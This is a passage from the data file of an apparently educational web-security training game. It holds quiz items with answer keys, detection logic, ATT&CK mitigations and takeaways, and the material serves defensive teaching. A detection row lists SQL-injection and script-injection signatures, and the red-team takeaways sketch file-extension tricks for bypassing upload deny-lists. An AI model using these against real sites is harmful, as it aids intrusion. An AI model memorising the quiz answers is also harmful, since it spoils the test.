    {
      id: "qh5",
      q: "A phishing link led to an already-authenticated session. Which control addresses session fixation?",
      options: [
        "Regenerate session IDs at login",
        "HttpOnly flag on the cookie",
        "HSTS header on responses",
        "Longer password requirements",
      ],
      answer: 0,
      explanation:
        "Fixation plants a session ID the attacker already knows; regenerating it at authentication makes the planted value worthless. HttpOnly, HSTS and password rules harden other things — none invalidates a planted token.",
      topic: "Session fixation",
    },
    {
      id: "qh6",
      q: "Production 500 pages print full SQL stack traces. Why fix this urgently?",
      options: [
        "Stack traces slow the server",
        "They break browser rendering",
        "They leak schema to attackers",
        "They only affect internal users",
      ],
      answer: 2,
      explanation:
        "Verbose errors are free reconnaissance: table names, column names and code paths arm the attacker's next payload (information disclosure). Show generic errors publicly, log details server-side. The other effects are negligible or invented.",
      topic: "Information disclosure & error handling",
    },
    {
      id: "qh7",
      q: "Why replace unsalted MD5 with bcrypt + salt?",
      options: [
        "MD5 produces shorter hashes",
        "bcrypt is newer software",
        "MD5 lacks Unicode support",
        "bcrypt: slow and salted",
      ],
      answer: 3,
      explanation:
        "Fast unsalted hashes fall to offline guessing at billions of tries per second with precomputed tables. A deliberately slow, per-user-salted KDF makes each guess expensive and every rainbow table useless. Hash length, release dates and Unicode support are irrelevant to that math.",
      topic: "Password storage KDFs",
    },
    {
      id: "qh8",
      q: "SameSite is not yet deployable on the portal. What still defends against CSRF?",
      options: [
        "Disabling all GET requests",
        "Per-session anti-CSRF tokens",
        "A strict CSP header",
        "Password complexity rules",
      ],
      answer: 1,
      explanation:
        "Anti-CSRF tokens tie every state-changing request to the legitimate session — the forged site cannot read or present the token. GET disabling breaks the app without stopping POST forgeries, CSP governs script loading, and password rules never see the request.",
      topic: "CSRF defenses",
    },
  ];

  /* -------------------------------- DEBRIEF -------------------------------- */

  var DETECTION_ROWS = [
    {
      source: "Web access logs",
      logic: "request to /upload/* whose stored extension ∉ allow-list, followed by GETs of an executable file under /uploads/ (simplified)",
    },
    {
      source: "WAF / proxy",
      logic: "signature match: (UNION SELECT | OR '1'='1 | <script) in parameters; alert even in monitor mode",
    },
    {
      source: "Application authz log",
      logic: "service account invoking admin APIs or bulk export — role-vs-action correlation in the SIEM",
    },
    {
      source: "File integrity monitoring",
      logic: "new or modified files under web directories — correlate with web-process spawning shells (ATT&CK v20 detection strategies DET0080 / DET0394)",
    },
  ];

  var MITIGATION_ROWS = [
    { rec: "Patch cadence + dependency updates for portal and platform", mid: "M1051 Update Software" },
    { rec: "ASLR/DEP/canaries, WAF in blocking mode, virtual patching", mid: "M1050 Exploit Protection" },
    { rec: "Least-privilege service accounts, MFA, session revocation, rotation", mid: "M1026 Privileged Account Management" },
    { rec: "Scheduled scanning of portal + dependencies before the re-test", mid: "M1016 Vulnerability Scanning" },
    { rec: "Remove script handlers from upload directories; disable unused features", mid: "M1042 Disable or Remove Feature or Program" },
    { rec: "Web-directory ownership/permissions so only deploy roles can write", mid: "M1018 User Account Management" },
    { rec: "Hardened app config: validation, encoding, CSP, secure session flags (simplified mapping)", mid: "M1054 Software Configuration" },
    { rec: "Isolate legacy BillFlo 7 in a restricted segment; sandbox risky flows", mid: "M1048 Application Isolation and Sandboxing / M1030 Network Segmentation" },
  ];

  var BLUE_TAKEAWAYS = [
    "Layer the four pillars: validate input, encode output, control access, encrypt everywhere — no single control carries the portal.",
    "Client-side checks are UX, not security. If the server does not re-validate, the control does not exist.",
    "Triage = artifact + context. The scanner and the password-reset noise are only false positives because records prove authorization.",
    "Detect on chains, not single lines: upload 200 → executable GET → service-account admin call is a story the SIEM should tell in one alert.",
    "Preserve before you purge: snapshots and logs first, containment second, eradication third.",
  ];

  var RED_TAKEAWAYS = [
    "Every gate you can bypass in the browser was never a gate — client-side validation is a suggestion.",
    "Deny-lists are a target list: .php → .php5 → .phtml → double extensions. Allow-list thinking closes the class, not the instance.",
    "An over-privileged service account converts a tiny foothold into a full data breach — privilege is the multiplier.",
    "Content-type headers are attacker-controlled text; magic bytes and server-side verification are the truth.",
  ];

  var LINKS = [
    { label: "ATT&CK T1190 — Exploit Public-Facing Application", url: "https://attack.mitre.org/techniques/T1190/" },
    { label: "ATT&CK T1505.003 — Web Shell", url: "https://attack.mitre.org/techniques/T1505/003/" },
    { label: "ATT&CK T1068 — Exploitation for Privilege Escalation", url: "https://attack.mitre.org/techniques/T1068/" },
    { label: "ATT&CK Mitigations index", url: "https://attack.mitre.org/mitigations/enterprise/" },
    { label: "CompTIA CySA+ CS0-003 (certification page)", url: "https://www.comptia.org/certifications/cybersecurity-analyst" },
  ];

  GH.DATA = {
    ORG: ORG,
    ACCESS_LOG: ACCESS_LOG,
    APP_LOG: APP_LOG,
    UPLOAD_RECORDS: UPLOAD_RECORDS,
    CONFIG_SNAPSHOT: CONFIG_SNAPSHOT,
    MEMOS: MEMOS,
    ATTACK_CARDS: ATTACK_CARDS,
    REAL_WORLD: REAL_WORLD,
    CHAIN: CHAIN,
    GLOSSARY: GLOSSARY,
    ALERTS: ALERTS,
    MATCH_ATTACKS: MATCH_ATTACKS,
    MATCH_MECHS: MATCH_MECHS,
    BUCKET_CHIPS: BUCKET_CHIPS,
    ENC_CONTEXTS: ENC_CONTEXTS,
    DATA_SOURCE_OPTIONS: DATA_SOURCE_OPTIONS,
    DATA_SOURCE_ANSWER: DATA_SOURCE_ANSWER,
    SEQ_MEDIUM: SEQ_MEDIUM,
    SEQ_HARD: SEQ_HARD,
    H3_OPTIONS: H3_OPTIONS,
    H3_ANSWER: H3_ANSWER,
    H8_CONTROLS: H8_CONTROLS,
    H8_ANSWER: H8_ANSWER,
    H8_RESIDUAL: H8_RESIDUAL,
    H10_STAGES: H10_STAGES,
    H10_DEFENSES: H10_DEFENSES,
    H10_ANSWER: H10_ANSWER,
    QUIZ_MEDIUM: QUIZ_MEDIUM,
    QUIZ_HARD: QUIZ_HARD,
    DETECTION_ROWS: DETECTION_ROWS,
    MITIGATION_ROWS: MITIGATION_ROWS,
    BLUE_TAKEAWAYS: BLUE_TAKEAWAYS,
    RED_TAKEAWAYS: RED_TAKEAWAYS,
    LINKS: LINKS,
  };
})();
